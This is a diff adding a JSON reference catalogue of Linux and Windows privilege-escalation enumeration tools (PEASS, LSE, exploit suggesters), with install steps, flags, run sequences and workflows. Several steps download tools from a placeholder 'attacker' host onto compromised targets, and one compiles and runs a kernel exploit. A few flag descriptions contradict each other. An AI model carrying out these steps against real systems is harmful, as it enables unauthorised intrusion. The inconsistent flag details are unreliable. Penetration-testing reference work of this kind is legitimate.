@@ -1,0 +1,972 @@
+[
+  {
+    "id": "linpeas",
+    "name": "LinPEAS",
+    "summary": "LinPEAS is a script that searches for possible paths to escalate privileges on Linux/Unix systems.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Download the latest script and stage it for transfer.",
+        "steps": [
+          {
+            "detail": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x linpeas.sh",
+            "copyable": true
+          },
+          {
+            "detail": "sha256sum linpeas.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "PEASS is packaged; keep /usr/share/peass up to date.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y peass",
+            "copyable": true
+          },
+          {
+            "detail": "ls /usr/share/peass/linPEAS",
+            "copyable": true
+          },
+          {
+            "detail": "cp /usr/share/peass/linPEAS/linpeas.sh ./linpeas.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Serve linpeas via HTTP/SMB to compromised hosts.",
+        "steps": [
+          {
+            "detail": "python3 -m http.server 8008 --directory $(pwd)",
+            "copyable": true
+          },
+          {
+            "detail": "curl http://attacker:8008/linpeas.sh -o /tmp/linpeas.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x /tmp/linpeas.sh",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run basic scan",
+        "command": "./linpeas.sh",
+        "notes": []
+      },
+      {
+        "description": "Quiet mode",
+        "command": "./linpeas.sh -q",
+        "notes": []
+      },
+      {
+        "description": "Check specific options",
+        "command": "./linpeas.sh -o /tmp/output.txt",
+        "notes": []
+      },
+      {
+        "description": "With colors disabled",
+        "command": "./linpeas.sh -nocolors",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-q",
+        "description": "Quiet mode"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-nocolors",
+        "description": "Disable colors"
+      },
+      {
+        "flag": "-w",
+        "description": "Wait time between checks"
+      },
+      {
+        "flag": "-P",
+        "description": "Password for sudo"
+      }
+    ],
+    "operational_tips": [
+      "Run with different user contexts for comprehensive coverage.",
+      "Save output for later analysis and correlation.",
+      "Focus on high-severity findings first.",
+      "Document all potential escalation paths."
+    ],
+    "step_sequences": [
+      {
+        "title": "Executing linpeas",
+        "steps": [
+          {
+            "title": "Transfer",
+            "details": "Upload linpeas to /tmp or /dev/shm on target.",
+            "command": "scp linpeas.sh user@target:/tmp/linpeas.sh"
+          },
+          {
+            "title": "Run",
+            "details": "Execute with high verbosity to capture all checks.",
+            "command": "./linpeas.sh -a"
+          },
+          {
+            "title": "Collect output",
+            "details": "Redirect output to file for later analysis.",
+            "command": "./linpeas.sh -a | tee /tmp/linpeas.log"
+          },
+          {
+            "title": "Review findings",
+            "details": "Search for SUID, cron, and kernel exploit hints.",
+            "command": "grep -n 'Interesting' /tmp/linpeas.log"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "linpeas \u2192 linux-smart-enumeration \u2192 exploit suggester",
+        "stages": [
+          {
+            "label": "Baseline enumeration",
+            "description": "Run linpeas to gather comprehensive host data.",
+            "command": "./linpeas.sh -a"
+          },
+          {
+            "label": "Focused enumeration",
+            "description": "Use linux-smart-enumeration for lightweight validation.",
+            "command": "lse.sh -l 1"
+          },
+          {
+            "label": "Exploit recommendation",
+            "description": "Feed kernel/version info into linux-exploit-suggester.",
+            "command": "linux-exploit-suggester.sh > les.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] [SUID] Interesting SUID binary: /usr/bin/screen",
+        "meaning": "Potential privesc via misconfigured SUID binary.",
+        "severity": "high"
+      },
+      {
+        "indicator": "[!] A new release of PEASS-ng is available",
+        "meaning": "Update linpeas.sh for the latest checks.",
+        "severity": "info"
+      },
+      {
+        "indicator": "[+] [CRON] Writable cron folder",
+        "meaning": "Check cron jobs for privilege escalation opportunities.",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Stealth mode",
+        "scenario": "Reduce noise when running on production systems.",
+        "command": "./linpeas.sh -s -o /tmp/linpeas_min.log",
+        "notes": [
+          "-s skips noisy checks; combine with tee to capture essential findings.",
+          "Use -P to output in JSON for ingestion into reporting tools."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "PEASS-ng repo",
+        "url": "https://github.com/carlospolop/PEASS-ng",
+        "description": "Latest linpeas and changelog."
+      }
+    ]
+  },
+  {
+    "id": "winpeas",
+    "name": "WinPEAS",
+    "summary": "WinPEAS is a script that searches for possible paths to escalate privileges on Windows systems.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Download the latest binary and host it for transfer.",
+        "steps": [
+          {
+            "detail": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe",
+            "copyable": true
+          },
+          {
+            "detail": "sha256sum winPEASany.exe",
+            "copyable": true
+          },
+          {
+            "detail": "python3 -m http.server 8082 --directory $(pwd)",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Use the PEASS package and copy binaries to loot folders.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y peass",
+            "copyable": true
+          },
+          {
+            "detail": "cp /usr/share/peass/winPEAS/winPEASany.exe ~/loot/winpeas.exe",
+            "copyable": true
+          },
+          {
+            "detail": "cp /usr/share/peass/winPEAS/winPEASx64.exe ~/loot/winpeas64.exe",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Serve binaries via SMB/HTTP for Windows targets.",
+        "steps": [
+          {
+            "detail": "impacket-smbserver loot $(pwd)",
+            "copyable": true
+          },
+          {
+            "detail": "copy \\\\attacker\\loot\\winPEASany.exe C:\\Temp\\winpeas.exe",
+            "copyable": true
+          },
+          {
+            "detail": "powershell -c \"Get-FileHash C:\\Temp\\winpeas.exe\"",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run basic scan",
+        "command": ".\\winPEAS.exe",
+        "notes": []
+      },
+      {
+        "description": "Check specific modules",
+        "command": ".\\winPEAS.exe systeminfo",
+        "notes": []
+      },
+      {
+        "description": "Quiet mode",
+        "command": ".\\winPEAS.exe quiet",
+        "notes": []
+      },
+      {
+        "description": "Output to file",
+        "command": ".\\winPEAS.exe output C:\\temp\\results.txt",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "systeminfo",
+        "description": "System information"
+      },
+      {
+        "flag": "processinfo",
+        "description": "Process information"
+      },
+      {
+        "flag": "quiet",
+        "description": "Quiet mode"
+      },
+      {
+        "flag": "output",
+        "description": "Output file"
+      },
+      {
+        "flag": "notcolor",
+        "description": "No colors"
+      }
+    ],
+    "operational_tips": [
+      "Run with different privilege levels.",
+      "Focus on services and scheduled tasks.",
+      "Check for weak permissions and configurations.",
+      "Document all findings for remediation."
+    ],
+    "step_sequences": [
+      {
+        "title": "Running winPEAS",
+        "steps": [
+          {
+            "title": "Transfer",
+            "details": "Upload winPEAS to the target (C:\\Temp recommended).",
+            "command": "copy \\\\attacker\\loot\\winPEASany.exe C:\\Temp\\winpeas.exe"
+          },
+          {
+            "title": "Execute",
+            "details": "Run with verbose logging to capture all checks.",
+            "command": "C:\\Temp\\winpeas.exe -a"
+          },
+          {
+            "title": "Export output",
+            "details": "Redirect output to a file for offline analysis.",
+            "command": "C:\\Temp\\winpeas.exe > C:\\Temp\\winpeas.txt"
+          },
+          {
+            "title": "Review",
+            "details": "Search for high-value findings such as Unquoted Service Paths or vulnerable registry keys.",
+            "command": "findstr /I \"[+]\" C:\\Temp\\winpeas.txt"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Windows Privilege Escalation Discovery and Exploit Suggestion",
+        "stages": [
+          {
+            "label": "Baseline",
+            "description": "Run winPEAS to gather OS/build info and privilege escalation hints.",
+            "command": "C:\\Temp\\winpeas.exe -a"
+          },
+          {
+            "label": "Exploit mapping",
+            "description": "Feed systeminfo output into windows-exploit-suggester.",
+            "command": "systeminfo > C:\\Temp\\sysinfo.txt"
+          },
+          {
+            "label": "Remediation",
+            "description": "Execute suggested exploits or misconfig fixes as allowed.",
+            "command": "windows-exploit-suggester.py --database 2024-10-01-mssb.xls --systeminfo sysinfo.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] Interesting Services",
+        "meaning": "Review for unquoted paths or weak ACLs.",
+        "severity": "high"
+      },
+      {
+        "indicator": "[+] Checking AlwaysInstallElevated",
+        "meaning": "If Enabled=1, you can install MSI packages with SYSTEM rights.",
+        "severity": "medium"
+      },
+      {
+        "indicator": "[i] New release available",
+        "meaning": "Download the latest build to ensure coverage of new checks.",
+        "severity": "info"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Colorless output",
+        "scenario": "Run winPEAS on constrained consoles without ANSI support.",
+        "command": "C:\\Temp\\winpeas.exe -nocolor -log C:\\Temp\\winpeas.log",
+        "notes": [
+          "Use -systeminfo to dump systeminfo automatically for later tools.",
+          "Combine with Evil-WinRM's upload function for quick execution."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "PEASS-ng release",
+        "url": "https://github.com/carlospolop/PEASS-ng/releases",
+        "description": "Latest winPEAS binaries."
+      }
+    ]
+  },
+  {
+    "id": "linux-smart-enumeration",
+    "name": "Linux Smart Enumeration",
+    "summary": "Linux Smart Enumeration (lse) is a script for Linux enumeration focused on privilege escalation.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Download the lightweight script.",
+        "steps": [
+          {
+            "detail": "wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x lse.sh",
+            "copyable": true
+          },
+          {
+            "detail": "sha256sum lse.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install via apt package and copy script for usage.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y linux-smart-enumeration",
+            "copyable": true
+          },
+          {
+            "detail": "cp /usr/share/linux-smart-enumeration/lse.sh ./lse.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x lse.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Host script via HTTP for download on compromised hosts.",
+        "steps": [
+          {
+            "detail": "python3 -m http.server 8085 --directory $(pwd)",
+            "copyable": true
+          },
+          {
+            "detail": "curl http://attacker:8085/lse.sh -o /tmp/lse.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x /tmp/lse.sh",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Run basic enumeration",
+        "command": "./lse.sh",
+        "notes": []
+      },
+      {
+        "description": "Specify level",
+        "command": "./lse.sh -l 2",
+        "notes": []
+      },
+      {
+        "description": "Save output",
+        "command": "./lse.sh -o /tmp/lse_output.txt",
+        "notes": []
+      },
+      {
+        "description": "With sudo check",
+        "command": "./lse.sh -s",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-l",
+        "description": "Level of detail (1-3)"
+      },
+      {
+        "flag": "-o",
+        "description": "Output file"
+      },
+      {
+        "flag": "-s",
+        "description": "Check sudo permissions"
+      },
+      {
+        "flag": "-i",
+        "description": "Information gathering only"
+      },
+      {
+        "flag": "-h",
+        "description": "Show help"
+      }
+    ],
+    "operational_tips": [
+      "Use higher levels for more comprehensive enumeration.",
+      "Combine with manual verification of findings.",
+      "Focus on SUID binaries and sudo permissions.",
+      "Document all potential privilege escalation vectors."
+    ],
+    "step_sequences": [
+      {
+        "title": "Running LSE",
+        "steps": [
+          {
+            "title": "Transfer",
+            "details": "Upload lse.sh to /tmp.",
+            "command": "scp lse.sh user@target:/tmp/lse.sh"
+          },
+          {
+            "title": "Quick scan",
+            "details": "Run low-level checks that avoid heavy noise.",
+            "command": "./lse.sh -l 1"
+          },
+          {
+            "title": "Detailed scan",
+            "details": "Run level 2 or 3 for deeper checks when authorized.",
+            "command": "./lse.sh -l 2 -i"
+          },
+          {
+            "title": "Review",
+            "details": "Inspect the highlighted findings grouped by severity.",
+            "command": "grep 'maybe' lse-report.txt"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Linux Enumeration Cross-Validation and Privilege Escalation",
+        "stages": [
+          {
+            "label": "Lightweight checks",
+            "description": "Run lse.sh first for quick wins on fragile boxes.",
+            "command": "./lse.sh -l 1"
+          },
+          {
+            "label": "Deep dive",
+            "description": "Execute linpeas for comprehensive enumeration.",
+            "command": "./linpeas.sh -a"
+          },
+          {
+            "label": "Exploit",
+            "description": "Use linux-exploit-suggester or manual techniques based on the findings.",
+            "command": "linux-exploit-suggester.sh"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[+] Exploitable SUID binaries",
+        "meaning": "Investigate suggested binaries for privilege escalation.",
+        "severity": "high"
+      },
+      {
+        "indicator": "[-] Kernel not listed",
+        "meaning": "LSE could not match kernel version; gather manually for LES.",
+        "severity": "info"
+      },
+      {
+        "indicator": "[!] Services running as root",
+        "meaning": "Check for writable service files or timers.",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Non-interactive mode",
+        "scenario": "Run via cron or remote shells without prompts.",
+        "command": "./lse.sh -l 3 -i -s report.txt",
+        "notes": [
+          "-s writes results to a file for offline review.",
+          "Use -c to provide custom command wrappers (e.g., via sudo)."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "LSE project",
+        "url": "https://github.com/diego-treitos/linux-smart-enumeration",
+        "description": "Documentation and release binaries."
+      }
+    ]
+  },
+  {
+    "id": "linux-exploit-suggester",
+    "name": "Linux Exploit Suggester",
+    "summary": "Linux Exploit Suggester is a tool that suggests possible exploits for Linux systems based on kernel version.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Download LES and keep databases current.",
+        "steps": [
+          {
+            "detail": "wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x linux-exploit-suggester.sh",
+            "copyable": true
+          },
+          {
+            "detail": "sha256sum linux-exploit-suggester.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Use the packaged script.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y linux-exploit-suggester",
+            "copyable": true
+          },
+          {
+            "detail": "cp /usr/share/linux-exploit-suggester/linux-exploit-suggester.sh ./les.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x les.sh",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Serve script via HTTP or embed into pwncat/linpeas workflows.",
+        "steps": [
+          {
+            "detail": "python3 -m http.server 8086 --directory $(pwd)",
+            "copyable": true
+          },
+          {
+            "detail": "curl http://attacker:8086/linux-exploit-suggester.sh -o /tmp/les.sh",
+            "copyable": true
+          },
+          {
+            "detail": "chmod +x /tmp/les.sh",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Check for exploits",
+        "command": "./linux-exploit-suggester.sh",
+        "notes": []
+      },
+      {
+        "description": "With kernel version",
+        "command": "./linux-exploit-suggester.sh -k 4.15.0",
+        "notes": []
+      },
+      {
+        "description": "Detailed output",
+        "command": "./linux-exploit-suggester.sh -d",
+        "notes": []
+      },
+      {
+        "description": "Check URL only",
+        "command": "./linux-exploit-suggester.sh -u",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "-k",
+        "description": "Kernel version"
+      },
+      {
+        "flag": "-d",
+        "description": "Detailed output"
+      },
+      {
+        "flag": "-u",
+        "description": "Check URL only"
+      },
+      {
+        "flag": "-f",
+        "description": "File with kernel info"
+      },
+      {
+        "flag": "-w",
+        "description": "Website to check"
+      }
+    ],
+    "operational_tips": [
+      "Always verify kernel version accurately.",
+      "Cross-reference exploits with vulnerability databases.",
+      "Test exploits in safe environments first.",
+      "Document all potential exploit paths."
+    ],
+    "step_sequences": [
+      {
+        "title": "Running LES",
+        "steps": [
+          {
+            "title": "Gather systeminfo",
+            "details": "Collect uname/system info for compatibility.",
+            "command": "uname -a > /tmp/les_sysinfo.txt"
+          },
+          {
+            "title": "Execute script",
+            "details": "Run LES to suggest kernel exploits.",
+            "command": "./linux-exploit-suggester.sh --kernel $(uname -r)"
+          },
+          {
+            "title": "Filter results",
+            "details": "Identify exploits with high reliability and match to allowed techniques.",
+            "command": "grep -A2 'Possible Exploits' -n les_output.txt"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "LinPEAS/LES combo",
+        "stages": [
+          {
+            "label": "Enumerate",
+            "description": "Run linpeas or lse to capture kernel version and packages.",
+            "command": "./linpeas.sh -a"
+          },
+          {
+            "label": "Suggest",
+            "description": "Execute LES using the captured data.",
+            "command": "./linux-exploit-suggester.sh --kernel $(uname -r)"
+          },
+          {
+            "label": "Exploit",
+            "description": "Attempt recommended exploit or document absence of safe options.",
+            "command": "gcc exploit.c -o exploit && ./exploit"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[*] [CVE-2017-16995] PTRACE_PEEKSIGINFO kernel memory disclosure",
+        "meaning": "Potential kernel exploit; confirm kernel version and if exploit is in scope.",
+        "severity": "high"
+      },
+      {
+        "indicator": "[!] Couldn't find distro version",
+        "meaning": "Provide systeminfo file manually for better accuracy.",
+        "severity": "info"
+      },
+      {
+        "indicator": "[+] You can try: overlayfs",
+        "meaning": "Exploit suggestion with existing PoC references.",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Offline mode",
+        "scenario": "Run LES without network access by providing cached advisories.",
+        "command": "./linux-exploit-suggester.sh --database ./linux-exploit-suggester.json",
+        "notes": [
+          "Update the JSON database regularly from the GitHub repo.",
+          "Share sanitized results with blue teams for remediation."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "LES GitHub",
+        "url": "https://github.com/mzet-/linux-exploit-suggester",
+        "description": "Project documentation and exploit references."
+      }
+    ]
+  },
+  {
+    "id": "windows-exploit-suggester",
+    "name": "Windows Exploit Suggester",
+    "summary": "Windows Exploit Suggester is a tool that suggests possible exploits for Windows systems based on system information.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Download the Python script and Microsoft bulletin database.",
+        "steps": [
+          {
+            "detail": "git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git",
+            "copyable": true
+          },
+          {
+            "detail": "cd Windows-Exploit-Suggester && pip install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "python windows-exploit-suggester.py --update",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Install via apt and store database under /usr/share.",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y windows-exploit-suggester",
+            "copyable": true
+          },
+          {
+            "detail": "cp /usr/share/windows-exploit-suggester/2024-10-01-mssb.xls ./mssb.xls",
+            "copyable": true
+          },
+          {
+            "detail": "python /usr/share/windows-exploit-suggester/windows-exploit-suggester.py -h",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker / Alternative",
+        "summary": "Run inside container to avoid local Python dependency conflicts.",
+        "steps": [
+          {
+            "detail": "docker pull python:3.11",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm -v $(pwd):/work python:3.11 bash -lc 'pip install xlrd && python /work/windows-exploit-suggester.py --update'",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --rm -v $(pwd):/work python:3.11 python /work/windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Check for exploits",
+        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt",
+        "notes": []
+      },
+      {
+        "description": "Detailed output",
+        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --detailed",
+        "notes": []
+      },
+      {
+        "description": "With cross-reference",
+        "command": "python3 windows-exploit-suggester.py --systeminfo systeminfo.txt --cross-reference",
+        "notes": []
+      },
+      {
+        "description": "Update database",
+        "command": "python3 windows-exploit-suggester.py --update",
+        "notes": []
+      }
+    ],
+    "common_flags": [
+      {
+        "flag": "--systeminfo",
+        "description": "Systeminfo file"
+      },
+      {
+        "flag": "--detailed",
+        "description": "Detailed output"
+      },
+      {
+        "flag": "--cross-reference",
+        "description": "Cross-reference exploits"
+      },
+      {
+        "flag": "--update",
+        "description": "Update exploit database"
+      },
+      {
+        "flag": "--output",
+        "description": "Output file"
+      }
+    ],
+    "operational_tips": [
+      "Run systeminfo command to gather system data.",
+      "Keep exploit database updated regularly.",
+      "Cross-reference with multiple vulnerability sources.",
+      "Test exploits in controlled environments."
+    ],
+    "step_sequences": [
+      {
+        "title": "Using Windows Exploit Suggester",
+        "steps": [
+          {
+            "title": "Collect systeminfo",
+            "details": "From the Windows host, capture systeminfo output.",
+            "command": "systeminfo > C:\\Temp\\sysinfo.txt"
+          },
+          {
+            "title": "Run suggester",
+            "details": "Feed the systeminfo output and latest database into the script.",
+            "command": "python windows-exploit-suggester.py --database 2024-10-01-mssb.xls --systeminfo sysinfo.txt"
+          },
+          {
+            "title": "Prioritize results",
+            "details": "Sort by exploit reliability and privileges required.",
+            "command": "grep -n 'Potentially Vulnerable' suggester.out"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Windows Enumeration and Exploit Recommendation Pipeline",
+        "stages": [
+          {
+            "label": "Run winPEAS",
+            "description": "Collect OS build and missing patch info.",
+            "command": "C:\\Temp\\winpeas.exe -systeminfo"
+          },
+          {
+            "label": "Export systeminfo",
+            "description": "Use systeminfo command if winPEAS output is insufficient.",
+            "command": "systeminfo > sysinfo.txt"
+          },
+          {
+            "label": "Generate exploit list",
+            "description": "Run the suggester to map missing MS bulletins to exploits.",
+            "command": "python windows-exploit-suggester.py --database mssb.xls --systeminfo sysinfo.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "[*] MS17-010 is missing!",
+        "meaning": "Target may be vulnerable to EternalBlue-style exploits.",
+        "severity": "high"
+      },
+      {
+        "indicator": "[-] No vulnerabilities found",
+        "meaning": "System fully patched relative to database; consider misconfiguration attacks instead.",
+        "severity": "info"
+      },
+      {
+        "indicator": "[*] Found 4 potential vulnerabilities",
+        "meaning": "Review each CVE and confirm exploit availability before action.",
+        "severity": "medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Offline database",
+        "scenario": "Run in isolated environments using previously downloaded bulletins.",
+        "command": "python windows-exploit-suggester.py --database offline.xls --systeminfo sysinfo.txt",
+        "notes": [
+          "Store multiple database snapshots to match the target's patch cadence.",
+          "Cross-reference results with Metasploit/ExploitDB for working PoCs."
+        ]
+      }
+    ],
+    "comparison_table": null,
+    "resources": [
+      {
+        "label": "Windows Exploit Suggester",
+        "url": "https://github.com/AonCyberLabs/Windows-Exploit-Suggester",
+        "description": "Project README and usage."
+      }
+    ]
+  }
+]
